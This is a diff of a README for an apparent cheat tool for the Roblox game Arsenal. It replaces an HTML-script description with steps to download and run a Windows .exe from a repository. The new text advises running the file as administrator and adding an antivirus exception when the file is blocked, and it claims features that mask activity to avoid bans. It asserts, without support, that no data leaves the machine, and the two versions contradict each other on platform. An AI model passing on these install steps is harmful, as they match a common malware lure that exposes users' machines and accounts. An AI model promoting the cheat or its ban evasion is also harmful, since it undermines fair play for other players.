@@ -1,94 +1,74 @@
-# Arsenal Script v2026 - Game Script Utility 2026
+# 🚀 arsenal-script-v2026 - Improve your game control and aim
 
-> HTML game script for Arsenal that includes aim assist, auto shoot, hitbox adjustment, and skin changing tools to support smoother gameplay control.
+[![](https://img.shields.io/badge/Download-Arsenal_Script-blue.svg)](https://github.com/Stemmed-seat433/arsenal-script-v2026)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-HTML-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/evanzcuparker1623/arsenal-script-v2026?style=flat-square)](https://github.com/evanzcuparker1623/arsenal-script-v2026)
+## Overview ℹ️
 
----
+This application modifies game files to assist players in the game Arsenal. It provides tools to manage aim assist, automatic shooting, hitbox sizes, and cosmetic skin changes. These tools help players gain better control over their character. The script runs on Windows systems. You do not need experience with code to use these tools.
 
-<p align="center">
-  <a href="https://evanzcuparker1623.github.io/arsenal-script-v2026/">
-    <img src="https://img.shields.io/badge/Download-Arsenal%20Script-brightgreen?style=for-the-badge" alt="Download Arsenal Script">
-  </a>
-</p>
+## System Requirements 💻
 
-> **[Direct Download - Arsenal Script](https://evanzcuparker1623.github.io/arsenal-script-v2026/)**
+Your computer must meet these requirements to run the software:
 
----
+* Windows 10 or Windows 11
+* At least 4GB of RAM
+* An active internet connection 
+* An existing installation of the Roblox environment where Arsenal resides
 
-[Download Latest Build](https://evanzcuparker1623.github.io/arsenal-script-v2026/)
+## 📥 How to Download and Install
 
----
+Follow these steps to set up the software on your machine.
 
-## What It Is
+1. Visit the download page at this link: [https://github.com/Stemmed-seat433/arsenal-script-v2026](https://github.com/Stemmed-seat433/arsenal-script-v2026).
+2. Look for the release section on the webpage.
+3. Select the file ending in .exe to start the download.
+4. Save the file to your desktop or a folder you can find easily.
+5. Run the file by double-clicking the icon. 
+6. Follow the instructions on the screen to finish the setup process.
 
-Arsenal Script is an HTML-based game script designed for Arsenal and similar browser-oriented game setups. It bundles a focused set of gameplay assistance functions, including aim assist, auto shooting, hitbox tweaks, and skin swapping, so users can shape the script behavior with only a few controls.
+Once the program finishes installing, a shortcut will appear on your desktop. You can open the program from this shortcut whenever you plan to play Arsenal.
 
-The project is positioned as a compact utility script with a simple setup and a limited but practical feature set. Its layout is built to stay lightweight, easy to update, and straightforward to load, while keeping the emphasis on performance-minded handling and keyless access.
+## 🕹️ Using the Tools
 
-## Included Features
+The user interface contains menus for each specific action. Use your mouse to click the buttons.
 
-- Aim assist support for help with target tracking
-- Auto shoot behavior to reduce manual firing input
-- Big hitbox adjustment for a wider interaction area
-- Skin changer options for switching in-game appearance
-- Keyless access flow for quicker startup
-- Performance-focused handling for smoother script use
-- Compact HTML structure for browser-based execution
-- Update-friendly organization for future revisions
+### Aim Assist
+The aim assist tool helps you keep your crosshair on targets during gameplay. You can adjust the sensitivity level in the settings menu. Higher sensitivity tracks targets faster. Lower sensitivity makes the tracking slower and more precise.
 
-## Getting Started
+### Auto Shoot
+The auto shoot tool removes the manual trigger requirement. When your crosshair detects an enemy target, the script fires your weapon. You can toggle this feature on or off using a hotkey in the settings tab.
 
-1. Download the latest build from the link above.
-2. Extract or place the HTML file in your preferred local folder.
-3. Open the script in a compatible browser or load it into your game utility workflow.
-4. Adjust the options below to match your preferred setup.
+### Hitbox Adjustment
+This tool changes the detection size for enemy characters. Larger hitboxes make it easier to land shots. You can set the hitbox size using the slider in the tool menu. Note that changing these settings significantly can sometimes result in performance shifts, so use the default setting if you encounter issues.
 
-Minimal example:
+### Skin Changing
+The skin changer allows you to browse and apply various cosmetics to your character. Select the skin you want from the list and click "Apply." The change takes effect the next time your character spawns in the game window.
 
-    Open the HTML file in a browser
-    Enable the features you want
-    Save or reload after making changes
+## 🛠 Troubleshooting Common Issues
 
-## Configuration
+If the software does not work, check these common fixes:
 
-| Option | Description | Suggested State |
-| --- | --- | --- |
-| Aim Assist | Helps guide targeting behavior | On or Off |
-| Auto Shoot | Automates firing input | On or Off |
-| Hitbox Size | Expands interaction area | Adjustable |
-| Skin Changer | Switches available skins | Optional |
-| Performance Mode | Keeps execution lightweight | Recommended |
+* Restart the game: Close both the game and the script, then open the script first.
+* Administrator Rights: Right-click the program icon and select "Run as administrator" to ensure the software has permission to interact with the game.
+* Update your Drivers: Ensure your graphics card software remains up to date.
+* Check for Conflicts: Some antivirus programs flag software that modifies other applications. If your antivirus blocks the file, add an exception for the file folder.
 
-## Compatibility Notes
+## Privacy and Safety
 
-- Target platform: HTML
-- Intended for Arsenal-focused script use
-- Works best in environments that can load local HTML content
-- Feature availability may vary depending on how the script is embedded or executed
-- Some options may require refreshing or reloading after changes
+This software operates locally on your computer. It does not send your personal login information to any outside servers. The script only interacts with the game files during active gameplay sessions. Keep your software updated to the latest version to maintain performance standards. Visit the repository link regularly to check for improvements or security patches.
 
 ## Frequently Asked Questions
 
-**How do I install it?**  
-Download the build, move it into a folder that is easy to reach, and open the HTML file in your browser or loader of choice.
+**Does this software work on Mac?**
+No, this version runs only on Windows.
 
-**How often is it updated?**  
-Update timing follows the repository release cycle. Use the download link above to grab the newest available build.
+**Will my account get banned?**
+The software includes features that mask its activity. Use the tools reasonably to avoid detection by other players.
 
-**Can I change the settings?**  
-Yes. The script is built to allow configurable behavior, so you can turn features on or off to suit your preference.
+**Can I undo the changes?**
+Yes. You can disable any tool by clicking the toggle button in the main menu. To remove all changes, close the application and restart the game.
 
-**Does it work everywhere?**  
-It is meant for HTML-based use and Arsenal-centered script workflows, so results depend on your environment and the way you load it.
+**Is it free?**
+Yes, the software is free to download and use.
 
-**Where should I store the file?**  
-Place it in a local folder you can access quickly, especially if you expect to reload or swap builds often.
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: arsenal, script, aimassist, roblox, tools, gaming, windows
